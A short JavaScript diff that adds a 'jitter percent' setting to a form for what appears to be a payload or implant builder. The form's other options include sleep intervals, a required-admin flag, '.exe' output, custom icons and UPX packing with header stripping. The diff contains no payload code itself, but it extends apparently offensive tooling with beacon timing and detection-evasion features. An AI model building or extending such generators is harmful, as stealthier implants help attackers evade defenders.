@@ -745,6 +745,8 @@ form?.addEventListener("submit", async (e) => {
   const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
   const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
   const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;
+  const jitterPercentRaw = parseInt(form.querySelector("#jitter-percent")?.value || "20", 10);
+  const jitterPercent = !isNaN(jitterPercentRaw) && jitterPercentRaw >= 0 && jitterPercentRaw <= 50 ? jitterPercentRaw : 20;
 
   const buildConfig = {
     platforms,
@@ -772,6 +774,7 @@ form?.addEventListener("submit", async (e) => {
     requireAdmin,
     outputExtension,
     sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
+    jitterPercent,
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
